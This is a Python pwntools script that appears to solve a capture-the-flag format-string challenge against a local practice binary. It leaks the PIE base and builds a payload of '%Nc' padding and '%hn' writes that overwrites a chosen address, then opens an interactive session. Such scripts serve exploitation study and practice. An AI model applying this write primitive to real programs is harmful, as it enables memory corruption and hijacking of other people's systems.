from pwn import *

import time

target = process("./chall-test_fmtString-4-x64")
gdb.attach(target, gdbscript="pie b *0x1237")

def getOverflowInt(bytesSize):
	x = 0x0
	for i in range(0, bytesSize):
		x = (x << 8)
		x = x | 0xff
	x += 1
	return x

def get0fInt(bytesSize):
	x = 0x0
	for i in range(0, bytesSize):
		x = (x << 8)
		x = x | 0xff
	return x

def getIntSizeBytes(x):
	if x == 0:
		return 0

	byteSize = 0
	while x != 0:
		x = (x >> 8)
		byteSize += 1
	return byteSize

def getWriteSize(writeValue, writtenValue):
	if writeValue > writtenValue:
		valuePrinted = writeValue - writtenValue
		return valuePrinted

	else:
		writeSize = getIntSizeBytes(writeValue)
		overflowInt = getOverflowInt(writeSize)
		andInt = get0fInt(writeSize)

		alreadyWritten = (writtenValue & andInt)
		reachOverflow = overflowInt - alreadyWritten

		valuePrinted = reachOverflow + writeValue 
		return valuePrinted

def genFodder(size):
	return size*"0"

def getBytesAt(value, offset, size):
	value = value >> (offset * 8)
	i = 0
	retValue = 0
	while size != 0:
		currentByte = (value & 0xff)
		value = value >> 8
		size -= 1
		currentByte = currentByte << (8*i)
		retValue = retValue | currentByte
		i += 1
	return retValue

def getStartingFmtStringOffsetsx64(positionOffset, bytesWritten, stackOffset):
	if positionOffset != 8:
		beginString = genFodder(positionOffset)
		bytesWritten += positionOffset
		stackOffset += 1
	else:
		beginString = ""
		return beginString, bytesWritten, stackOffset

def getAddressesx64(writeSizes, address):
	addresses = []
	bytesWritten = 0
	for i in range(0, len(writeSizes)):
		addresses.append(p64(address + bytesWritten))
		bytesWritten += writeSizes[i]
	return addresses

def getx64WriteSizes(value):
	writeSize = getIntSizeBytes(value)
	writeSizes = [2]*(int(writeSize / 2))
	if (writeSize % 2) != 0:
		writeSizes.append(1)
	return writeSizes

def getValuesx64(numWrites, writeSizes, value):
	values = []
	writtenBytes = 0
	for i in range(0, numWrites):
		values.append(getBytesAt(value, writtenBytes, writeSizes[i]))
		writtenBytes += writeSizes[i]
	return values

def writePrintSizesx64(numWrites, values, origBytesWritten):
	bytesWritten = origBytesWritten
	printSizes = []
	for i in range(0, numWrites):
		printSize = getWriteSize(values[i], bytesWritten)
		bytesWritten += printSize
		printSizes.append("%{size}c".format(size = printSize))
	return printSizes

def writeWritesx64(numWrites, writeSizes, stackOffset, value, fmtStrSize):
	writes = []
	stackOffset += int(fmtStrSize / 8)
	for i in range(0, numWrites):
		if writeSizes[i] == 2:
			writes.append("%{offset}$hn".format(offset=stackOffset))
		elif writeSizes[i] == 1:
			writes.append("%{offset}$hhn".format(offset=stackOffset))
		stackOffset += 1
	return writes

def getLargestFmtStrSizex64(value):
	numBytes = getIntSizeBytes(value)
	if numBytes == 1:
		return 0x10

	elif numBytes == 2:
		return 0x10

	elif numBytes == 3:
		return 0x20

	elif numBytes == 4:
		return 0x20

	elif numBytes == 5:
		return 0x30

	elif numBytes == 6:
		return 0x30

	elif numBytes == 7:
		return 0x40

	elif numBytes == 8:
		return 0x40

def generatePayloadx64(numWrites, printValues, writes, addresses, value, fmtStrSize):
	payload = ""
	for i in range(0, numWrites):
		payload += printValues[i]
		payload += writes[i]
	payload += "0"*(fmtStrSize - len(payload))
	for i in range(0, numWrites):
		payload += addresses[i]
	return payload
def getPrintSizesx64ZeroOut(numWrites, values, origBytesWritten):
	bytesWritten = origBytesWritten
	printSizes = []
        reachedEnd = False
	for i in range(0, numWrites):
#		if bytesWritten == 0x10000:
#			printSizes.append("%{bytes}c".format(bytes = printSize, index=i))
#			continue
#		if bytesWritten > 0x10000:
#			printSize = 0x10000 - (bytesWritten & 0xffff)
#			printSizes.append("%{bytes}c".format(bytes = printSize, index=i))
#			bytesWritten = 0x10000
#			continue
                if values[i] == 0x0:
                    if reachedEnd == False:
                        printSize = 0x10000 - (bytesWritten & 0xffff)
                        printSizes.append("%{bytes}c".format(bytes = printSize, index=i))
                        reachedEnd = True
                    else:
                        printSizes.append("%65536c")
                    continue
                printSize = getWriteSizeShort(values[i], bytesWritten)
		bytesWritten += printSize
		printSizes.append("%{bytes}c".format(bytes = printSize, index=i))
	return printSizes

def getWritesx64ZeroOut(numWrites, writeSizes, stackOffset, value, fmtStrSize):
	stackOffset += int(fmtStrSize / 8)
	writes = []
	for i in range(0, numWrites):
		if writeSizes[i] == 2:
			writes.append("%{offset}$hn".format(offset=stackOffset))
		elif writeSizes[i] == 1:
			writes.append("%{offset}$hhn".format(offset=stackOffset))
		stackOffset += 1
	return writes

def getWriteSizeShort(writeValue, writtenValue):
	if writeValue > writtenValue:
		valuePrinted = writeValue - writtenValue
		return valuePrinted
	else:
		writeSize = 2
		overflowInt = getOverflowInt(writeSize)
		targetValue = overflowInt + writeValue
		valuePrinted = targetValue - (writtenValue & 0xffff)
		return valuePrinted
target.recvuntil("We're dreaming: ")
leak = int(target.recvuntil("\n").strip("\n"), 16)
pieBase = leak - (4576)
print("PieBase is: %s" % hex(pieBase))

stackOffset = 6
bytesOffset = 0
positionOffset = 8


value = pieBase + 0x11c9

address = pieBase + 0x33d0

print("Value is: %s" % hex(value))
print("Address is: %s" % hex(address))


writeSizes = [2, 2, 2, 2]
numWrites = 4
fmtStrSize = 0x40
addresses = getAddressesx64(writeSizes, address)

values = getValuesx64(numWrites, writeSizes, value)

beginString, bytesWritten, stackOffset = getStartingFmtStringOffsetsx64(positionOffset, bytesOffset, stackOffset)

printValues = getPrintSizesx64ZeroOut(numWrites, values, bytesWritten)

writes = getWritesx64ZeroOut(numWrites, writeSizes, stackOffset, value, fmtStrSize)

payload = generatePayloadx64(numWrites, printValues, writes, addresses, value, fmtStrSize)

target.sendline(payload)

#print("Addresses: %s" % str(addresses))
print("Values: %s" % str(values))

target.interactive()
